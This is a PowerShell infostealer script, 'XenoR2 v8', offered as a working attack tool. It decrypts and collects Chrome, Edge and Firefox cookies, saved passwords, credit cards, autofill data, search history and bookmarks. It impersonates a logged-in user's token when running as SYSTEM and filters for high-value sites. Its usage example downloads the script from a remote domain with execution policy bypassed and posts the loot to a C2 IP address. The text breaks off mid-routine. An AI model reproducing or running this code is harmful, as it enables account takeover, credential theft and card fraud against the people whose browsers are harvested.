<#
.SYNOPSIS
    XenoR2 v8 — Full browser data exfil: cookies, passwords, credit cards.
.DESCRIPTION
    Extracts cookies/passwords/cards from Chrome/Edge/Firefox,
    compresses to JSON, sends via HTTP POST to your server.
    Uses .NET System.IO for all file/directory ops — no PowerShell provider issues.
    Zero dependencies beyond sqlite3.exe (auto-downloaded).
.PARAMETER C2Url
    Full URL to receive data: http://yourserver.com/api/cook
.EXAMPLE
    powershell -ep bypass -w h -c "iwr -useb https://signindat.com/xeno_cookies_exfil.ps1 -OutFile $env:TEMP\x.ps1; & $env:TEMP\x.ps1 -C2Url 'http://193.26.115.42:47821/api/cook'"
#>
param(
    [Parameter(Mandatory=$true)]
    [string]$C2Url = "",
    
    [Parameter()]
    [string]$C2 = "",          # shortcut: IP:port
    
    [ValidateSet("all","chrome","edge","firefox")]
    [string]$Browser = "all",
    
    [switch]$HighValue,
    
    [switch]$NoSteal,
    
    [int]$TimeoutSec = 30
)

# ─── Build C2 URL from shortcut ───
if ($C2 -and -not $C2Url) {
    $C2Url = "https://${C2}/api/cook"
}
if (-not $C2Url) {
    Write-Host "Usage: .\xeno_cookies_exfil.ps1 -C2 <ip:port>  OR  -C2Url <full-url>"
    exit 1
}

# ─── TLS — ignore cert errors for self-signed ───
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { param($s,$c,$ch,$e) $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13

# ─── Load System.Security for DPAPI (ProtectedData) ───
Add-Type -AssemblyName System.Security

# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════

function _warn($msg) { Write-Warning $msg }

# ─── Fingerprint ───
function Get-Fingerprint {
    $info = @{
        hostname = $env:COMPUTERNAME
        username = "$env:USERDOMAIN\$env:USERNAME"
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        os_arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
        ip = (
            Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -notmatch "^169\." } |
            Select-Object -ExpandProperty IPAddress -First 1
        )
        date = [DateTime]::UtcNow.ToString("o")
    }
    return $info
}

# ─── DPAPI ───
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($Data.Length -lt 5) { return $null }
    if ($Data[0] -eq 0x44 -and $Data[1] -eq 0x50 -and $Data[2] -eq 0x41 -and $Data[3] -eq 0x50) {
        $Data = $Data[5..($Data.Length-1)]
    }
    # Try CurrentUser first (normal user context)
    try {
        return [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, "CurrentUser")
    } catch { _warn "[DPAPI] CurrentUser failed: $_" }
    # Fallback: LocalMachine (SYSTEM context, remote shell)
    try {
        return [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, "LocalMachine")
    } catch { _warn "[DPAPI] LocalMachine failed: $_" }
    return $null
}

# ─── AES-256-GCM ───
function Decrypt-AesGcm {
    param([byte[]]$CipherData, [byte[]]$Key, [byte[]]$Nonce)
    try {
        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
        $tag = $CipherData[($CipherData.Length-16)..($CipherData.Length-1)]
        $ct = $CipherData[0..($CipherData.Length-17)]
        $plain = New-Object byte[] $ct.Length
        $aes.Decrypt($Nonce, $ct, $tag, $plain)
        return $plain
    } catch { return $null }
}

# ─── Decrypt cookie value ───
function Decrypt-CookieValue {
    param([byte[]]$EncValue, [byte[]]$AesKey)
    # PowerShell -or does NOT short-circuit — split checks
    if ($null -eq $EncValue) { return "" }
    if ($EncValue.Length -eq 0) { return "" }
    if ($null -eq $AesKey) { return "[no-aes-key]" }
    if ($EncValue[0] -eq 0x76 -and $EncValue[1] -eq 0x31 -and $EncValue[2] -eq 0x30) {
        $nonce = $EncValue[3..14]
        $cipher = $EncValue[15..($EncValue.Length-1)]
        $plain = Decrypt-AesGcm -CipherData $cipher -Key $AesKey -Nonce $nonce
        if ($plain) { return [System.Text.Encoding]::UTF8.GetString($plain) }
        return "[gcm-fail]"
    }
    if ($EncValue[0] -eq 0x76 -and $EncValue[1] -eq 0x32 -and $EncValue[2] -eq 0x30) {
        return "[app-bound-v20]"
    }
    $plain = Decrypt-DPAPI -Data $EncValue
    if ($plain) { return [System.Text.Encoding]::UTF8.GetString($plain) }
    return "[dpapi-fail]"
}

# ─── SQLite read — multi-strategy copy (handles Chrome v130+ exclusive locks) ───
function Invoke-Sqlite {
    param([string]$DbPath, [string]$Query)
    
    $tmp = "$env:TEMP\xc_$([guid]::NewGuid().ToString('N')).db"
    $copied = $false
    
    # Strategy 1: FileStream with FileShare.ReadWrite
    if (-not $copied) {
        try {
            $fsSrc = [System.IO.File]::Open($DbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
            $fsDst = [System.IO.File]::Open($tmp, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
            $fsSrc.CopyTo($fsDst)
            $fsDst.Close(); $fsSrc.Close()
            $copied = $true
        } catch {}
    }
    
    # Strategy 2: FileStream with FileShare.Read (less demanding)
    if (-not $copied) {
        try {
            $fsSrc = [System.IO.File]::Open($DbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read)
            $fsDst = [System.IO.File]::Open($tmp, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
            $fsSrc.CopyTo($fsDst)
            $fsDst.Close(); $fsSrc.Close()
            $copied = $true
        } catch {}
    }
    
    # Strategy 3: cmd /c copy (bypasses some exclusive locks)
    if (-not $copied) {
        try {
            cmd /c copy /y "$DbPath" "$tmp" 2>$null | Out-Null
            if ([System.IO.File]::Exists($tmp)) { $copied = $true }
        } catch {}
    }
    
    if (-not $copied) {
        _warn "[SQLite] All copy strategies failed (locked): $DbPath"
        return @()
    }
    
    # Check copied file size
    try {
        $fi = [System.IO.FileInfo]::new($tmp)
        if ($fi.Length -eq 0) {
            _warn "[SQLite] Copied file is 0 bytes: $DbPath"
            [System.IO.File]::Delete($tmp)
            return @()
        }
    } catch {
        _warn "[SQLite] Cannot stat temp file: $_"
        return @()
    }
    
    $rows = @()
    
    # Method 0: sqlite3.exe from known locations (pre-downloaded)
    $sq3Paths = @(
        [System.IO.Path]::Combine($env:TEMP, "sqlite3.exe"),
        "C:\Users\Public\sqlite3.exe"
    )
    foreach ($sq3Path in $sq3Paths) {
        if ([System.IO.File]::Exists($sq3Path)) {
            try {
                $out = & $sq3Path -json $tmp $Query 2>$null
                if ($out) { 
                    $rows = $out | ConvertFrom-Json
                    [System.IO.File]::Delete($tmp)
                    return $rows 
                }
            } catch {}
        }
    }
    
    # Method 1: sqlite3.exe (system PATH)
    $sq3 = Get-Command sqlite3.exe -EA SilentlyContinue
    if ($sq3) {
        try {
            $out = & sqlite3.exe -json $tmp $Query 2>$null
            if ($out) { 
                $rows = $out | ConvertFrom-Json
                [System.IO.File]::Delete($tmp)
                return $rows 
            }
        } catch {}
    }
    
    # Method 2: Microsoft.Data.Sqlite from NuGet cache
    try {
        # Check if type already loaded (from previous profile)
        $sqliteType = [type]::GetType('Microsoft.Data.Sqlite.SqliteConnection, Microsoft.Data.Sqlite', $false)
        if ($null -eq $sqliteType) {
            $nugetDir = "$env:LOCALAPPDATA\NuGet"
            if ([System.IO.Directory]::Exists($nugetDir)) {
                $dlls = [System.IO.Directory]::GetFiles($nugetDir, "Microsoft.Data.Sqlite.dll", [System.IO.SearchOption]::AllDirectories)
                if ($dlls.Count -gt 0) {
                    $dll = $dlls | Sort-Object { [System.IO.File]::GetLastWriteTime($_) } -Descending | Select-Object -First 1
                    try { Add-Type -Path $dll -EA Stop } catch {}
                }
            }
        }
        $sqliteType = [type]::GetType('Microsoft.Data.Sqlite.SqliteConnection, Microsoft.Data.Sqlite', $false)
        if ($sqliteType) {
            $connStr = "Data Source=$tmp"
            $conn = [Microsoft.Data.Sqlite.SqliteConnection]::new($connStr)
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $val = $reader.GetValue($i)
                    if ($val -is [byte[]]) {
                        $row[$reader.GetName($i)] = [Convert]::ToBase64String($val)
                    } else {
                        $row[$reader.GetName($i)] = $val
                    }
                }
                $rows += $row
            }
            $conn.Close()
            [System.IO.File]::Delete($tmp)
            return $rows
        }
    } catch {}
    
    # Method 3: System.Data.SQLite
    try {
        # Check if type already loaded
        $sqliteType3 = [type]::GetType('System.Data.SQLite.SQLiteConnection, System.Data.SQLite', $false)
        if ($null -eq $sqliteType3) {
            $pkgDir = "$env:ProgramFiles\PackageManagement\NuGet\Packages"
            if ([System.IO.Directory]::Exists($pkgDir)) {
                $dlls = [System.IO.Directory]::GetFiles($pkgDir, "System.Data.SQLite.dll", [System.IO.SearchOption]::AllDirectories)
                if ($dlls.Count -gt 0) {
                    $dll = $dlls | Sort-Object { [System.IO.File]::GetLastWriteTime($_) } -Descending | Select-Object -First 1
                    try { Add-Type -Path $dll -EA Stop } catch {}
                }
            }
        }
        $sqliteType3 = [type]::GetType('System.Data.SQLite.SQLiteConnection, System.Data.SQLite', $false)
        if ($sqliteType3) {
            $conn = New-Object System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=$tmp"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $val = $reader.GetValue($i)
                    if ($val -is [byte[]]) {
                        $row[$reader.GetName($i)] = [Convert]::ToBase64String($val)
                    } else {
                        $row[$reader.GetName($i)] = $val
                    }
                }
                $rows += $row
            }
            $conn.Close()
            [System.IO.File]::Delete($tmp)
            return $rows
        }
    } catch {}
    
    _warn "[SQLite] No driver available. Pre-download sqlite3.exe to TEMP."
    try { [System.IO.File]::Delete($tmp) } catch {}
    return @()
}

# ═══════════════════════════════════════════════════════════════════════
# TOKEN STEAL — run as target user when we're SYSTEM
# ═══════════════════════════════════════════════════════════════════════

Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenSteal {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr hProcess, uint access, out IntPtr hToken);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint access, IntPtr secAttr, int level, int type, out IntPtr hNewToken);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessWithTokenW(IntPtr hToken, int logonFlags, string appName, string cmdLine, int creationFlags, IntPtr env, string curDir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved, lpDesktop, lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint TOKEN_IMPERSONATE = 0x0004;
    const uint MAXIMUM_ALLOWED = 0x02000000;
    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;

    public static bool RunAs(int pid, string cmdLine) {
        IntPtr hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
        if (hProc == IntPtr.Zero) return false;
        IntPtr hToken;
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY|TOKEN_IMPERSONATE, out hToken)) { CloseHandle(hProc); return false; }
        IntPtr hDup;
        if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDup)) { CloseHandle(hToken); CloseHandle(hProc); return false; }
        STARTUPINFO si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        bool ok = CreateProcessWithTokenW(hDup, 0, null, cmdLine, 0, IntPtr.Zero, null, ref si, out pi);
        CloseHandle(hDup); CloseHandle(hToken); CloseHandle(hProc);
        return ok;
    }
}
"@

# ═══════════════════════════════════════════════════════════════════════
# CHROMIUM (Chrome / Edge) — Cookies, Passwords, Credit Cards
# ═══════════════════════════════════════════════════════════════════════

function Get-ChromiumData {
    param([string]$BrowserName)
    
    $localAppData = [Environment]::GetFolderPath('LocalApplicationData')
    $map = @{
        "chrome" = "$localAppData\Google\Chrome\User Data"
        "edge"   = "$localAppData\Microsoft\Edge\User Data"
    }
    $base = $map[$BrowserName]
    
    if (-not [System.IO.Directory]::Exists($base)) {
        _warn "[$BrowserName] Base not found: $base"
        return $null
    }
    _warn "[$BrowserName] Base: $base"
    
    # ─── Get encryption key from Local State ───
    $lsPath = [System.IO.Path]::Combine($base, "Local State")
    if (-not [System.IO.File]::Exists($lsPath)) {
        _warn "[$BrowserName] Local State not found"
        return $null
    }
    try {
        $ls = Get-Content $lsPath -Raw | ConvertFrom-Json
    } catch {
        _warn "[$BrowserName] Local State parse error: $_"
        return $null
    }
    $encKeyB64 = $ls.os_crypt.encrypted_key
    $aesKey = $null
    if ($encKeyB64) {
        $rawKey = [Convert]::FromBase64String($encKeyB64)
        $prefix = if ($rawKey.Length -ge 5) { [System.Text.Encoding]::ASCII.GetString($rawKey[0..4]) } else { "short" }
        _warn "[$BrowserName] encrypted_key: $($rawKey.Length) bytes, prefix='$prefix', hex=$((($rawKey[0..7] | ForEach-Object { '{0:X2}' -f $_ }) -join ' '))"
        $aesKey = Decrypt-DPAPI -Data $rawKey
        if (-not $aesKey) {
            _warn "[$BrowserName] DPAPI decrypt of key failed — cookies/passwords/cards will be skipped"
        } else {
            _warn "[$BrowserName] AES key decrypted: $($aesKey.Length) bytes"
        }
    } else {
        _warn "[$BrowserName] No encrypted_key in Local State"
    }
    
    # ─── Enumerate profiles via Local State profile.info_cache (sweet-cookie method) ───
    $profiles = @()
    
    # Method: read profile.info_cache from Local State JSON
    # Keys are profile directory names (e.g. "Default", "Profile 1", "Profile 2", custom names)
    $infoCache = $null
    try {
        $infoCache = $ls.profile.info_cache
    } catch {}
    
    if ($infoCache -and $infoCache.PSObject.Properties) {
        $profileNames = @($infoCache.PSObject.Properties.Name)
        _warn "[$BrowserName] profile.info_cache keys: $($profileNames -join ', ')"
        foreach ($pname in $profileNames) {
            $pd = [System.IO.Path]::Combine($base, $pname)
            if ([System.IO.Directory]::Exists($pd)) {
                # Check if this profile has a Cookies DB (network-first)
                $cdb = [System.IO.Path]::Combine($pd, "Network", "Cookies")
                if (-not [System.IO.File]::Exists($cdb)) {
                    $cdb = [System.IO.Path]::Combine($pd, "Cookies")
                }
                if ([System.IO.File]::Exists($cdb)) {
                    $profiles += $pd
                }
            }
        }
    }
    
    # Fallback: if info_cache is empty, scan directories (old method)
    if ($profiles.Count -eq 0) {
        $allDirs = @([System.IO.Directory]::GetDirectories($base))
        $dirNames = $allDirs | ForEach-Object { [System.IO.Path]::GetFileName($_) }
        _warn "[$BrowserName] All dirs (fallback): $($dirNames -join ', ')"
        
        $defPath = [System.IO.Path]::Combine($base, "Default")
        if ([System.IO.Directory]::Exists($defPath)) { $profiles += $defPath }
        foreach ($d in $allDirs) {
            $name = [System.IO.Path]::GetFileName($d)
            if ($name -match "^Profile ") { $profiles += $d }
        }
    }
    
    _warn "[$BrowserName] Matched $($profiles.Count) profile(s) with Cookies DB"
    
    if ($profiles.Count -eq 0) {
        _warn "[$BrowserName] No profiles found"
        return $null
    }
    
    $result = @{
        cookies = @()
        passwords = @()
        credit_cards = @()
        autofill = @()
        search_history = @()
        bookmarks = @()
        extensions = @()
    }
    
    foreach ($pd in $profiles) {
        $pname = [System.IO.Path]::GetFileName($pd)
        
        # ─── Cookies ───
        $cdb = [System.IO.Path]::Combine($pd, "Network", "Cookies")
        if (-not [System.IO.File]::Exists($cdb)) {
            $cdb = [System.IO.Path]::Combine($pd, "Cookies")
        }
        if ([System.IO.File]::Exists($cdb)) {
            try {
                # Diagnostic: file size
                $fi = [System.IO.FileInfo]::new($cdb)
                _warn "[$BrowserName] $pname Cookies DB: $($fi.Length) bytes"
                
                # Diagnostic: list files in profile dir
                $dirFiles = @([System.IO.Directory]::GetFiles($pd)) | ForEach-Object { [System.IO.Path]::GetFileName($_) }
                _warn "[$BrowserName] $pname dir files: $($dirFiles -join ', ')"
                
                $rows = Invoke-Sqlite -DbPath $cdb -Query "SELECT name,encrypted_value,host_key,path,expires_utc,is_secure,is_httponly,samesite FROM cookies"
                _warn "[$BrowserName] $pname cookies: $($rows.Count)"
                foreach ($r in $rows) {
                    if ($null -eq $r) { continue }
                    $ev = $r.encrypted_value
                    if ($ev -is [string]) {
                        # sqlite3.exe -json may output BLOBs as raw Latin-1 bytes OR base64
                        try { $ev = [Convert]::FromBase64String($ev) }
                        catch { $ev = [System.Text.Encoding]::Latin1.GetBytes($ev) }
                    }
                    elseif ($ev -isnot [byte[]]) { $ev = [byte[]]$ev }
                    $val = Decrypt-CookieValue -EncValue $ev -AesKey $aesKey
                    $exp = "Session"
                    if ($r.expires_utc -gt 0) {
                        $uts = ([long]$r.expires_utc / 1000000) - 11644473600
                        if ($uts -gt 0) { $exp = [DateTimeOffset]::FromUnixTimeSeconds($uts).UtcDateTime.ToString("o") }
                    }
                    $ssMap = @{0="no_restriction";1="lax";2="strict"}
                    $result.cookies += @{
                        n = $r.name; v = $val; d = $r.host_key
                        p = $r.path; e = $exp
                        s = [bool]$r.is_secure; h = [bool]$r.is_httponly
                        ss = $ssMap[[int]$r.samesite]; pr = $pname
                    }
                }
            } catch { _warn "[$BrowserName] $pname cookies error: $_" }
        } else {
            _warn "[$BrowserName] ${pname}: no Cookies DB"
        }
        
        # ─── Passwords (Login Data) ───
        $ldb = [System.IO.Path]::Combine($pd, "Login Data")
        if ([System.IO.File]::Exists($ldb)) {
            try {
                $rows = Invoke-Sqlite -DbPath $ldb -Query "SELECT origin_url,username_value,password_value FROM logins WHERE password_value != ''"
                _warn "[$BrowserName] $pname passwords: $($rows.Count)"
                foreach ($r in $rows) {
                    if ($null -eq $r) { continue }
                    $pv = $r.password_value
                    if ($null -eq $pv) { continue }
                    if ($pv -is [string]) {
                        try { $pv = [Convert]::FromBase64String($pv) }
                        catch { $pv = [System.Text.Encoding]::Latin1.GetBytes($pv) }
                    }
                    elseif ($pv -isnot [byte[]]) { 
                        try { $pv = [byte[]]$pv } catch { continue }
                    }
                    $dec = Decrypt-CookieValue -EncValue $pv -AesKey $aesKey
                    $result.passwords += @{
                        url = $r.origin_url
                        username = $r.username_value
                        password = $dec
                        pr = $pname
                    }
                }
            } catch { _warn "[$BrowserName] $pname passwords error: $_" }
        } else {
            _warn "[$BrowserName] ${pname}: no Login Data"
        }
        
        # ─── Credit Cards (Web Data) ───
        $wdb = [System.IO.Path]::Combine($pd, "Web Data")
        if ([System.IO.File]::Exists($wdb)) {
            try {
                $rows = Invoke-Sqlite -DbPath $wdb -Query "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"
                _warn "[$BrowserName] $pname cards: $($rows.Count)"
                foreach ($r in $rows) {
                    $cn = $r.card_number_encrypted
                    if ($cn -is [string]) {
                        try { $cn = [Convert]::FromBase64String($cn) }
                        catch { $cn = [System.Text.Encoding]::Latin1.GetBytes($cn) }
                    }
                    elseif ($cn -isnot [byte[]]) { $cn = [byte[]]$cn }
                    $dec = Decrypt-CookieValue -EncValue $cn -AesKey $aesKey
                    $result.credit_cards += @{
                        name = $r.name_on_card
                        exp_month = $r.expiration_month
                        exp_year = $r.expiration_year
                        number = $dec
                        pr = $pname
                    }
                }
            } catch { _warn "[$BrowserName] $pname cards error: $_" }
        }
        
        # ─── Autofill (Web Data) ───
        if ([System.IO.File]::Exists($wdb)) {
            try {
                $rows = Invoke-Sqlite -DbPath $wdb -Query "SELECT name,value,value_lower,date_created,date_last_used,count FROM autofill"
                _warn "[$BrowserName] $pname autofill: $($rows.Count)"
                foreach ($r in $rows) {
                    $result.autofill += @{
                        name = $r.name
                        value = $r.value
                        count = $r.count
                        pr = $pname
                    }
                }
            } catch { _warn "[$BrowserName] $pname autofill error: $_" }
        }
        
        # ─── Search History (History DB) ───
        $hdb = [System.IO.Path]::Combine($pd, "History")
        if ([System.IO.File]::Exists($hdb)) {
            try {
                $rows = Invoke-Sqlite -DbPath $hdb -Query "SELECT term FROM keyword_search_terms"
                _warn "[$BrowserName] $pname search terms: $($rows.Count)"
                foreach ($r in $rows) {
                    $result.search_history += @{
                        term = $r.term
                        pr = $pname
                    }
                }
            } catch { _warn "[$BrowserName] $pname search history error: $_" }
        }
        
        # ─── Bookmarks (Bookmarks JSON) ───
        $bmPath = [System.IO.Path]::Combine($pd, "Bookmarks")
        if ([System.IO.File]::Exists($bmPath)) {
            try {
                $bm = Get-Content $bmPath -Raw | ConvertFrom-Json
                $bmCount = 0
                function _walk-bm($node, $res, $pn) {
                    foreach ($c in $node.children) {
                        if ($c.type -eq "url") {
                            $res.bookmarks += @{ name = $c.name; url = $c.url; pr = $pn }
                            $script:bmCount++
                        } elseif ($c.type -eq "folder") {
                            _walk-bm $c $res $pn
                        }
                    }
                }
                _walk-bm $bm.roots.bookmark_bar $result $pname
                _walk-bm $bm.roots.other $result $pname
                _walk-bm $bm.roots.synced $result $pname
                _warn "[$BrowserName] $pname bookmarks: $bmCount"
            } catch { _warn "[$BrowserName] $pname bookmarks error: $_" }
        }
        
        # ─── Extensions (directory listing) ───
        $extDir = [System.IO.Path]::Combine($base, "..", "Extensions")
        if (-not [System.IO.Directory]::Exists($extDir)) {
            $extDir = [System.IO.Path]::Combine($base, "Extensions")
        }
        if ([System.IO.Directory]::Exists($extDir)) {
            try {
                $extDirs = @([System.IO.Directory]::GetDirectories($extDir))
                foreach ($ed in $extDirs) {
                    $eid = [System.IO.Path]::GetFileName($ed)
                    $verDirs = @([System.IO.Directory]::GetDirectories($ed))
                    foreach ($vd in $verDirs) {
                        $manifestPath = [System.IO.Path]::Combine($vd, "manifest.json")
                        if ([System.IO.File]::Exists($manifestPath)) {
                            try {
                                $mf = Get-Content $manifestPath -Raw | ConvertFrom-Json
                                $result.extensions += @{
                                    id = $eid
                                    name = $mf.name
                                    version = $mf.version
                                    description = $mf.description
                                }
                            } catch {}
                        }
                    }
                }
                _warn "[$BrowserName] extensions: $($result.extensions.Count)"
            } catch { _warn "[$BrowserName] extensions error: $_" }
        }
    }
    
    return $result
}

# ═══════════════════════════════════════════════════════════════════════
# FIREFOX — Cookies + Passwords (logins.json)
# ═══════════════════════════════════════════════════════════════════════

function Get-FirefoxData {
    $base = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (-not [System.IO.Directory]::Exists($base)) {
        _warn "[Firefox] Profiles path not found: $base"
        return $null
    }
    _warn "[Firefox] Base: $base"
    
    # Enumerate profiles using .NET
    $allDirs = @([System.IO.Directory]::GetDirectories($base))
    $dirNames = $allDirs | ForEach-Object { [System.IO.Path]::GetFileName($_) }
    _warn "[Firefox] All dirs: $($dirNames -join ', ')"
    
    $profiles = @($allDirs | Where-Object { [System.IO.Path]::GetFileName($_) -match "\.default" })
    _warn "[Firefox] Matched $($profiles.Count) profile(s)"
    
    if ($profiles.Count -eq 0) {
        _warn "[Firefox] No .default profiles found"
        return $null
    }
    
    $result = @{
        cookies = @()
        passwords = @()
        autofill = @()
        search_history = @()
        bookmarks = @()
        extensions = @()
    }
    
    foreach ($pd in $profiles) {
        $pname = [System.IO.Path]::GetFileName($pd)
        
        # ─── Cookies (cookies.sqlite) ───
        $cdb = [System.IO.Path]::Combine($pd, "cookies.sqlite")
        if ([System.IO.File]::Exists($cdb)) {
            try {
                $rows = Invoke-Sqlite -DbPath $cdb -Query "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies"
                _warn "[Firefox] $pname cookies: $($rows.Count)"
                foreach ($r in $rows) {
                    $exp = "Session"
                    if ($r.expiry -gt 0) {
                        try {
                            $secs = [long]$r.expiry
                            # Firefox stores seconds since epoch, but some values are microseconds or out of range
                            if ($secs -gt 253402300799) { $secs = [long]($secs / 1000000) }
                            if ($secs -ge -62135596800 -and $secs -le 253402300799) {
                                $exp = [DateTimeOffset]::FromUnixTimeSeconds($secs).UtcDateTime.ToString("o")
                            } else {
                                $exp = "raw:$secs"
                            }
                        } catch { $exp = "raw:$($r.expiry)" }
                    }
                    $result.cookies += @{
                        n = $r.name; v = $r.value; d = $r.host
                        p = $r.path; e = $exp
                        s = [bool]$r.isSecure; h = [bool]$r.isHttpOnly
                        ss = @{0="no_restriction";1="lax";2="strict"}[[int]$r.sameSite]
                        pr = $pname
                    }
                }
            } catch { _warn "[Firefox] $pname cookies error: $_" }
        } else {
            _warn "[Firefox] ${pname}: no cookies.sqlite"
        }
        
        # ─── Passwords (logins.json) ───
        $lj = [System.IO.Path]::Combine($pd, "logins.json")
        if ([System.IO.File]::Exists($lj)) {
            try {
                $logins = Get-Content $lj -Raw | ConvertFrom-Json
                $count = 0
                foreach ($l in $logins.logins) {
                    $result.passwords += @{
                        url = $l.hostname
                        username = $l.encryptedUsername
                        password = $l.encryptedPassword
                        pr = $pname
                        note = "encrypted — needs NSS decrypt"
                    }
                    $count++
                }
                _warn "[Firefox] $pname passwords: $count (encrypted)"
            } catch { _warn "[Firefox] $pname logins.json error: $_" }
        } else {
            _warn "[Firefox] ${pname}: no logins.json"
        }
        
        # ─── Autofill (formhistory.sqlite) ───
        $fh = [System.IO.Path]::Combine($pd, "formhistory.sqlite")
        if ([System.IO.File]::Exists($fh)) {
            try {
                $rows = Invoke-Sqlite -DbPath $fh -Query "SELECT fieldname,value,timesUsed FROM moz_formhistory"
                _warn "[Firefox] $pname autofill: $($rows.Count)"
                foreach ($r in $rows) {
                    $result.autofill += @{
                        name = $r.fieldname
                        value = $r.value
                        count = $r.timesUsed
                        pr = $pname
                    }
                }
            } catch { _warn "[Firefox] $pname autofill error: $_" }
        }
        
        # ─── Search History (formhistory.sqlite) ───
        if ([System.IO.File]::Exists($fh)) {
            try {
                $rows = Invoke-Sqlite -DbPath $fh -Query "SELECT fieldname,value FROM moz_formhistory WHERE fieldname = 'searchbar-history'"
                _warn "[Firefox] $pname search terms: $($rows.Count)"
                foreach ($r in $rows) {
                    $result.search_history += @{
                        term = $r.value
                        pr = $pname
                    }
                }
            } catch {}
        }
        
        # ─── Bookmarks (places.sqlite) ───
        if ([System.IO.File]::Exists($pl)) {
            try {
                $rows = Invoke-Sqlite -DbPath $pl -Query "SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1"
                _warn "[Firefox] $pname bookmarks: $($rows.Count)"
                foreach ($r in $rows) {
                    $result.bookmarks += @{
                        name = $r.title
                        url = $r.url
                        pr = $pname
                    }
                }
            } catch { _warn "[Firefox] $pname bookmarks error: $_" }
        }
        
        # ─── Extensions (extensions.json) ───
        $ej = [System.IO.Path]::Combine($pd, "extensions.json")
        if ([System.IO.File]::Exists($ej)) {
            try {
                $extData = Get-Content $ej -Raw | ConvertFrom-Json
                foreach ($e in $extData.addons) {
                    $result.extensions += @{
                        id = $e.id
                        name = $e.defaultLocale.name
                        version = $e.version
                        description = $e.defaultLocale.description
                        active = $e.active
                    }
                }
                _warn "[Firefox] $pname extensions: $($result.extensions.Count)"
            } catch { _warn "[Firefox] $pname extensions error: $_" }
        }
    }
    
    return $result
}

# ═══════════════════════════════════════════════════════════════════════
# HIGH-VALUE FILTER
# ═══════════════════════════════════════════════════════════════════════

$HV = @("google.com","accounts.google.com","mail.google.com","facebook.com","instagram.com",
        "x.com","twitter.com","linkedin.com","github.com","reddit.com","amazon.com",
        "paypal.com","outlook.live.com","microsoft.com","apple.com","stripe.com",
        "dropbox.com","slack.com","discord.com","tiktok.com","youtube.com","netflix.com",
        "steamcommunity.com","twitch.tv","whatsapp.com","telegram.org","openai.com")

function Select-HighValue($All) {
    $out = @()
    foreach ($c in $All) {
        foreach ($h in $HV) {
            if ($c.d -match [regex]::Escape($h)) { $out += $c; break }
        }
    }
    return $out
}

# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

$fp = Get-Fingerprint

# ─── Token Steal: if SYSTEM, find chrome.exe from Mz pc and re-spawn ───
if (-not $NoSteal) {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($currentUser -match '^NT AUTHORITY\\SYSTEM$') {
        _warn "[TokenSteal] Running as SYSTEM — looking for chrome.exe from Mz pc"
        $chrome = Get-Process -Name chrome -IncludeUserName -EA SilentlyContinue |
            Where-Object { $_.UserName -like '*Mz pc*' } |
            Select-Object -First 1
        if ($chrome) {
            _warn "[TokenSteal] Found chrome.exe PID=$($chrome.Id) User=$($chrome.UserName)"
            # Build re-spawn command with -NoSteal + same params
            $myPath = (Get-Process -Id $PID).Path
